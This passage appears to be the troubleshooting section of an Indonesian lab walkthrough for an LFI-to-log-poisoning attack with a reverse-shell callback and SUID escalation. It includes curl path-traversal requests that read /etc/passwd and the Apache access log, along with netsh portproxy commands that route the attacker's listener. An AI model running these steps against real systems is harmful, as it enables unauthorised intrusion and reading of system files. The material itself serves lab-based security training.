...
## 18. Troubleshooting Lengkap

### 18.1 `ModuleNotFoundError: No module named 'paramiko'`

**Penyebab:** dependency Python belum terpasang pada environment yang menjalankan script.
...
```bash
python -c "import paramiko, requests; print(paramiko.__version__)"
```

---

### 18.2 `OSError: [Errno 98] Address already in use`

**Penyebab:** port `12345` sedang dipakai listener lama.
...
Jalankan ulang hanya setelah output pemeriksaan terakhir kosong.

---

### 18.3 Script Berhenti pada `Sending payload`

**Kemungkinan penyebab:**

- target tidak dapat mencapai callback IP;
- `-r` menggunakan IP WSL NAT, bukan IP Windows Host-Only;
- portproxy belum dibuat;
- Windows Firewall memblokir port;
- log Apache berbeda lokasi;
- LFI tidak memuat access log.
...
```powershell
netsh interface portproxy show v4tov4
Get-NetFirewallRule -DisplayName "WSL Listener 12345"
```

Untuk capture ini, nilai callback yang benar adalah:
...
### 18.4 IP WSL Berubah Setelah Restart
...
Buat ulang menggunakan IP WSL terbaru:

```powershell
netsh interface portproxy add v4tov4 `
  listenaddress=0.0.0.0 `
  listenport=12345 `
  connectaddress=<IP_WSL_TERBARU> `
  connectport=12345
```
...
Periksa apakah aplikasi menambahkan ekstensi otomatis. Gunakan response length dan kata `root:x:0:0` sebagai indikator.

```bash
curl -s "$BASE/?page=../../../../etc/passwd" | grep 'root:x:0:0'
```
...
```bash
curl -s "$BASE/?page=/var/log/apache2/access.log" | tail -n 20
```

Alternatif lokasi log yang dapat diperiksa pada lab lain:
...
Lokasi pada capture SIPADU adalah:
...
```bash
findmnt -no TARGET,OPTIONS / /usr 2>/dev/null
```

Jika filesystem menggunakan `nosuid`, bit SUID tidak akan efektif.
